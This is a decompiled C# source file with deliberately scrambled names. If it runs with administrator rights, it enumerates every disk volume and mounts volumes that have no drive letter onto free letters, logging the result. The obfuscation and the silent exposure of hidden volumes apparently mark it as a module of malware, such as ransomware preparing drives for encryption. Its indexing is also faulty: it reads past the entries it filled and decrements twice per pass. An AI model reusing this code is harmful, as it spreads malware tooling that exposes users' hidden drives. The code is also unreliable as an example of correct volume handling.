using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace YzTymtbtgFABHvJvj;

public static class MHLcaZVHYzQhlav
{
	public enum ZGawDDrKAQtt : uint
	{
		tUtUpCdaOdnqM,
		iduNpigiNljxnAcaCn,
		clsZxBdrHshPnk,
		XqmEuCvmpHz,
		dIyHPxTQmUjNf,
		gWGLBntKNTHcYv,
		ZJsnlSaXtltJjY
	}

	[CompilerGenerated]
	private sealed class WQGgpyYYYriuvcWH
	{
		public uint TkJtWHrviuhp;

		public uint KBTVVRtnzPi;

		public char[] xonCLBaQQfLm;

		public bool _003CMountVolumes_003Eb__0(string volumeName)
		{
			return !GetVolumePathNamesForVolumeNameW(volumeName, xonCLBaQQfLm, KBTVVRtnzPi, ref TkJtWHrviuhp) || xonCLBaQQfLm.Length != 3;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern ZGawDDrKAQtt GetDriveType([MarshalAs(UnmanagedType.LPStr)] string lQILiJiFZPKtR);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string isWJDoFWNPCy, char[] gMfJRRHBMhvy, uint LgTKTfFXFxn, ref uint SVJWUBvghUUW);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string KQKUMTbSNjAo, string bTtweAEBTpSAzcu);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder REMIjfazxWcKIYCV, int XuLAqmXtnwP);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int CudtfJshhYjFAPi, StringBuilder KKqWoTaYcQmjC, int txHtehDpKsi);

	public static List<string> gIrbDXQtqzH()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int cudtfJshhYjFAPi = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(cudtfJshhYjFAPi, stringBuilder, 1024));
		return list;
	}

	public static void GhmPmUDXWekkOV()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			string[] array = new string[26]
			{
				"Q:\\", "W:\\", "E:\\", "R:\\", "T:\\", "Y:\\", "U:\\", "I:\\", "O:\\", "P:\\",
				"A:\\", "S:\\", "D:\\", "F:\\", "G:\\", "H:\\", "J:\\", "K:\\", "L:\\", "Z:\\",
				"X:\\", "C:\\", "V:\\", "B:\\", "N:\\", "M:\\"
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == ZGawDDrKAQtt.iduNpigiNljxnAcaCn)
				{
					array2[num++] = text;
				}
			}
			List<string> source = gIrbDXQtqzH();
			uint TkJtWHrviuhp = 0u;
			uint KBTVVRtnzPi = 120u;
			char[] xonCLBaQQfLm = new char[260];
			foreach (string item in source.Where((string volumeName) => !GetVolumePathNamesForVolumeNameW(volumeName, xonCLBaQQfLm, KBTVVRtnzPi, ref TkJtWHrviuhp) || xonCLBaQQfLm.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (eqCksjvMyn.aLMUqgosPdtj)
				{
					try
					{
						Console.WriteLine("Drive Mounted: {0}", array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (eqCksjvMyn.nOaztTOGmlogd)
			{
				try
				{
					File.AppendAllText(eqCksjvMyn.zRTqZqtXid, "Error while mounting network drives: " + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
